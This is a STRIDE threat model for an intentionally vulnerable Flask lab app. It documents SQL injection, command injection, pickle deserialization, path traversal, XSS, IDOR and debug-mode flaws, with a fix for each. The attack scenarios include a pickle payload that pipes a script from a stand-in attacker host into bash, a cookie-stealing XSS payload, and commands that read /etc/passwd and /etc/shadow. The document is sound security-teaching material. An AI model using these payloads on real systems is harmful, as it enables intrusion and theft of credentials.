# Threat Model — secure-sdlc-lab Flask Application

**Version:** 1.0  
**Author:** Yash (a1phacharlie)  
**Date:** 2026-06-01  
**Methodology:** STRIDE  
**Scope:** `app/app.py` — deliberately vulnerable Flask web application  

---

## 1. Application Overview

The application is a Python/Flask web app exposing 8 HTTP endpoints.
It accepts user input via query parameters and form data, processes it
against an in-memory SQLite database, and returns HTML responses.

It runs as a single process with no authentication layer, no session
management, and no output encoding.

---

## 2. Assets (what we are protecting)

| Asset | Why it matters |
|-------|---------------|
| User records in SQLite | Contains usernames, passwords, roles |
| Server filesystem | `/read-file` can expose any file the process can read |
| Host OS process execution | `/ping` with `shell=True` allows arbitrary command execution |
| Application source code | `/read-file?name=app.py` exposes the full source |
| Werkzeug debugger PIN | Exposed via debug mode — grants RCE via browser console |
| Dependent service credentials | `SECRET_KEY`, `DB_PASSWORD` hardcoded in source |

---

## 3. Trust Boundaries

```
┌─────────────────────────────────────────────────────┐
│  INTERNET (untrusted)                               │
│                                                     │
│   Attacker / Browser / ZAP / curl                  │
└──────────────────┬──────────────────────────────────┘
                   │  HTTP on :5000
                   ▼
┌─────────────────────────────────────────────────────┐
│  FLASK APPLICATION BOUNDARY                         │
│                                                     │
│   app.py — no auth, no input validation             │
│                                                     │
│  ┌────────────────┐    ┌──────────────────────┐    │
│  │  SQLite DB     │    │  OS subprocess       │    │
│  │  (in-memory)   │    │  (ping, shell=True)  │    │
│  └────────────────┘    └──────────────────────┘    │
│                                                     │
│  ┌────────────────┐    ┌──────────────────────┐    │
│  │  Filesystem    │    │  pickle.loads()      │    │
│  │  (open())      │    │  (deserialization)   │    │
│  └────────────────┘    └──────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

**Trust boundary violations in this app:**
- User input crosses the HTTP boundary directly into SQL queries (no parameterisation)
- User input crosses the HTTP boundary directly into shell commands (no sanitisation)
- User input crosses the HTTP boundary directly into `open()` calls (no path restriction)
- User-supplied bytes cross the HTTP boundary into `pickle.loads()` (no validation)

---

## 4. STRIDE Threat Analysis

STRIDE categories:
- **S** — Spoofing (impersonating another user or system)
- **T** — Tampering (modifying data or code)
- **R** — Repudiation (denying actions were taken)
- **I** — Information Disclosure (exposing data to unauthorised parties)
- **D** — Denial of Service (making the system unavailable)
- **E** — Elevation of Privilege (gaining more access than authorised)

---

### 4.1 /login — SQL Injection

**Endpoint:** `GET /login?user=&pass=`  
**Vulnerability ID:** V-01  
**STRIDE category:** E — Elevation of Privilege, I — Information Disclosure

**Threat description:**  
The username and password are interpolated directly into the SQL query string
using an f-string. An attacker can inject SQL metacharacters to bypass
authentication, enumerate all users, or extract the entire database.

**Attack scenario:**
```
GET /login?user=admin'--&pass=anything
Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='anything'
The -- comments out the password check → logged in as admin without password
```

**STRIDE mapping:**
- E: Attacker escalates from unauthenticated to admin without credentials
- I: `' OR '1'='1` dumps all user rows including passwords

**Current control:** None  
**Missing control:** Parameterised queries → `conn.execute("SELECT * FROM users WHERE username=?", (user,))`  
**Bandit rule:** B608  
**CVSS estimate:** 9.8 (Critical) — network, no auth, full impact  

---

### 4.2 /ping — OS Command Injection

**Endpoint:** `GET /ping?host=`  
**Vulnerability ID:** V-02  
**STRIDE category:** E — Elevation of Privilege, D — Denial of Service

**Threat description:**  
The `host` parameter is passed directly to `subprocess.check_output()` with
`shell=True`. This hands user input to the OS shell, allowing arbitrary
command execution in the context of the application process.

**Attack scenario:**
```
GET /ping?host=127.0.0.1;cat+/etc/passwd
OS executes: ping -c 1 127.0.0.1; cat /etc/passwd
Returns: full /etc/passwd contents in HTTP response

GET /ping?host=127.0.0.1;rm+-rf+/tmp/*
OS executes destructive commands
```

**STRIDE mapping:**
- E: Web user escalates to OS-level command execution
- D: Attacker runs `sleep 9999` or fork bombs to exhaust resources

**Current control:** None  
**Missing control:** `subprocess.run(["ping", "-c", "1", host], shell=False)` + hostname validation  
**Bandit rule:** B602, B605  
**CVSS estimate:** 9.8 (Critical) — network, no auth, complete OS compromise  

---

### 4.3 /deserialize — Insecure Deserialization (RCE)

**Endpoint:** `POST /deserialize`  
**Vulnerability ID:** V-04  
**STRIDE category:** E — Elevation of Privilege

**Threat description:**  
`pickle.loads()` is called on user-supplied POST body bytes without any
validation. Python's pickle format executes arbitrary Python code embedded
in the serialised object during deserialization. This is unconditional
Remote Code Execution.

**Attack scenario:**
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.com/shell.sh | bash",))

payload = pickle.dumps(RCE())
# POST payload bytes to /deserialize
# Server executes: curl https://attacker.com/shell.sh | bash
```

**STRIDE mapping:**
- E: Complete server takeover — attacker runs arbitrary code as the app user

**Current control:** None  
**Missing control:** Never deserialise untrusted data with pickle. Use `json.loads()` or a schema-validated format (Pydantic, marshmallow)  
**Bandit rule:** B301  
**CVSS estimate:** 10.0 (Critical) — network, no auth, complete system compromise  

---

### 4.4 /read-file — Path Traversal / LFI

**Endpoint:** `GET /read-file?name=`  
**Vulnerability ID:** V-05  
**STRIDE category:** I — Information Disclosure

**Threat description:**  
The `name` parameter is passed directly to `open()` with no path sanitisation.
An attacker can use `../` sequences to read any file the process has access to,
including OS credentials, private keys, and application secrets.

**Attack scenario:**
```
GET /read-file?name=../../etc/passwd      → reads /etc/passwd
GET /read-file?name=../../etc/shadow      → reads password hashes
GET /read-file?name=../app.py             → reads full application source
GET /read-file?name=../../.env            → reads environment secrets
```

**STRIDE mapping:**
- I: Full read access to the server filesystem up to process permissions

**Current control:** None  
**Missing control:**
```python
import os
safe_dir = "/app/static/"
requested = os.path.realpath(os.path.join(safe_dir, name))
if not requested.startswith(safe_dir):
    abort(403)
```
**Bandit rule:** flagged as medium (open with unsanitised input)  
**CVSS estimate:** 7.5 (High) — network, no auth, high confidentiality impact  

---

### 4.5 /search — Reflected XSS

**Endpoint:** `GET /search?q=`  
**Vulnerability ID:** V-06  
**STRIDE category:** S — Spoofing, T — Tampering

**Threat description:**  
The `q` parameter is rendered directly into the HTML response without escaping.
An attacker crafts a URL containing JavaScript. When a victim clicks the link,
the script executes in the victim's browser under the application's origin,
allowing session theft, credential harvesting, and UI manipulation.

**Attack scenario:**
```
GET /search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
Victim clicks link → their cookies are sent to attacker's server
```

**STRIDE mapping:**
- S: Attacker impersonates the application to the victim's browser
- T: Attacker tampers with the page rendered to the victim

**Current control:** None  
**Missing control:** `html.escape(q)` or use Jinja2 templates (auto-escaping enabled by default)  
**Bandit rule:** Not detected by SAST (runtime only) — found by ZAP rule 40012  
**CVSS estimate:** 6.1 (Medium) — network, user interaction required  

---

### 4.6 /user/<id> — IDOR

**Endpoint:** `GET /user/<id>`  
**Vulnerability ID:** V-09  
**STRIDE category:** I — Information Disclosure, S — Spoofing

**Threat description:**  
Any unauthenticated visitor can enumerate all user records by incrementing
the `id` parameter. There is no session check, no ownership verification,
and no role check. This is a broken access control vulnerability (OWASP API1).

**Attack scenario:**
```
GET /user/1 → returns admin record
GET /user/2 → returns alice record
GET /user/3 → returns bob record
# Automated: for i in range(1, 10000): requests.get(f"/user/{i}")
```

**STRIDE mapping:**
- I: Full user enumeration — all usernames, IDs, and roles exposed
- S: Attacker can identify admin accounts for targeted attacks

**Current control:** None  
**Missing control:** Require authentication. Check `session['user_id'] == user_id` or `session['role'] == 'admin'`  
**Bandit rule:** Not detected by SAST — found by ZAP active scan  
**CVSS estimate:** 7.5 (High) — network, no auth, high confidentiality impact  

---

### 4.7 Hardcoded Credentials

**Location:** `app.py` lines 35–36  
**Vulnerability ID:** V-03  
**STRIDE category:** I — Information Disclosure, S — Spoofing

**Threat description:**  
`SECRET_KEY` and `DB_PASSWORD` are hardcoded as string literals in source
code. When the source is committed to a public repository — or when the repo
is compromised — these credentials are permanently exposed. They cannot be
rotated without a code change, and they persist in git history forever.

**Attack scenario:**
```
# Anyone with repo access (or if repo is public):
grep -r "SECRET_KEY\|PASSWORD" app/
→ sup3rs3cr3t-do-not-ship
→ admin:hunter2
```

**STRIDE mapping:**
- I: Credentials exposed to anyone who can read the source
- S: Attacker uses SECRET_KEY to forge Flask session cookies

**Current control:** None  
**Missing control:** `SECRET_KEY = os.environ.get("SECRET_KEY")` — load from environment variable, inject via GitHub Secrets in CI  
**Bandit rule:** B105, B106  
**CVSS estimate:** 8.1 (High) — once key is known, session forgery is trivial  

---

### 4.8 Debug Mode + Werkzeug Debugger

**Location:** `app.run(debug=True)`  
**Vulnerability ID:** V-08  
**STRIDE category:** E — Elevation of Privilege

**Threat description:**  
Running Flask with `debug=True` enables the Werkzeug interactive debugger.
The debugger exposes a Python REPL accessible at any 500 error page, protected
only by a PIN. The PIN is derivable from `/proc/self/cgroup` (readable via
the LFI vulnerability V-05) and from `/etc/machine-id`. Once the PIN is
bypassed, the debugger grants full Python code execution in the server process.

**Note:** ZAP found the debugger at `/deserialize?__debugger__=yes&cmd=resource&f=debugger.js`
— confirming it is actively accessible.

**STRIDE mapping:**
- E: Browser-accessible Python REPL → complete server compromise
- Chains with V-05 (LFI) to derive the debugger PIN

**Current control:** None  
**Missing control:** `debug=False` in production. Use gunicorn: `gunicorn -w 4 app:app`  
**Bandit rule:** B201  
**CVSS estimate:** 9.8 (Critical) when chained with LFI  

---

## 5. Threat Priority Matrix

| ID | Threat | STRIDE | CVSS | Priority |
|----|--------|--------|------|----------|
| V-04 | Pickle RCE via deserialization | E | 10.0 | P0 — Critical |
| V-02 | Command injection via /ping | E, D | 9.8 | P0 — Critical |
| V-01 | SQL injection via /login | E, I | 9.8 | P0 — Critical |
| V-08 | Debug mode RCE (chained) | E | 9.8 | P0 — Critical |
| V-03 | Hardcoded SECRET_KEY | I, S | 8.1 | P1 — High |
| V-09 | IDOR on /user/<id> | I, S | 7.5 | P1 — High |
| V-05 | Path traversal / LFI | I | 7.5 | P1 — High |
| V-07 | Weak hash MD5 | I | 5.3 | P2 — Medium |
| V-06 | Reflected XSS | S, T | 6.1 | P2 — Medium |
| V-10 | Open redirect | S | 4.3 | P3 — Low |

---

## 6. Tool Coverage Map

This table shows which vulnerabilities each tool in Pillar 1 detected.
The gaps demonstrate why all three tools are needed.

| Vulnerability | Bandit (SAST) | pip-audit (SCA) | ZAP (DAST) |
|---------------|:---:|:---:|:---:|
| V-01 SQL Injection | ✓ B608 | — | ✓ 10099 |
| V-02 Command Injection | ✓ B602 | — | — |
| V-03 Hardcoded Creds | ✓ B105 | — | — |
| V-04 Pickle RCE | ✓ B301 | — | ✓ 90022 |
| V-05 Path Traversal | ✓ (medium) | — | — |
| V-06 Reflected XSS | — | — | ✓ 40012 |
| V-07 Weak MD5 | ✓ B324 | — | — |
| V-08 Debug Mode | ✓ B201 | — | ✓ 10027 |
| V-09 IDOR | — | — | ✓ (active) |
| V-10 Open Redirect | — | — | ✓ 10028 |
| Flask CVE-2018-1000656 | — | ✓ | — |
| Werkzeug CVEs (9) | — | ✓ | — |
| Missing CSP header | — | — | ✓ 10038 |
| Missing X-Frame-Options | — | — | ✓ 10020 |

**Key insight:** XSS (V-06) and IDOR (V-09) are invisible to SAST because
they require runtime context. CVEs in dependencies are invisible to SAST
and DAST because they live in library code. Missing headers are invisible
to SAST and SCA because they're a runtime configuration issue.
This is why no single tool replaces the others.

---

## 7. Assumptions and Out of Scope

**Assumptions:**
- App runs on a single server with direct internet access
- No reverse proxy, WAF, or load balancer in front of the app
- All endpoints are publicly accessible (no network-level controls)
- The SQLite database is in-memory and resets on restart

**Out of scope for this threat model:**
- Infrastructure threats (server OS, cloud provider)
- Physical security
- Social engineering / phishing
- Third-party integrations (none exist in this app)

---

## 8. Remediation Summary

All findings are intentional for learning purposes. The remediated version
is in `app/app-secure.py` (added in Pillar 5). Key fixes:

1. Replace f-string SQL with parameterised queries
2. Replace `shell=True` subprocess with argument list
3. Replace `pickle.loads()` with `json.loads()`
4. Add `os.path.realpath()` check with allowlist directory
5. Replace MD5 with `hashlib.sha256()`
6. Add Flask-Talisman for security headers
7. Move `SECRET_KEY` to environment variable
8. Set `debug=False`, use gunicorn in production
9. Add authentication check to `/user/<id>`
10. Add URL allowlist to `/redirect`
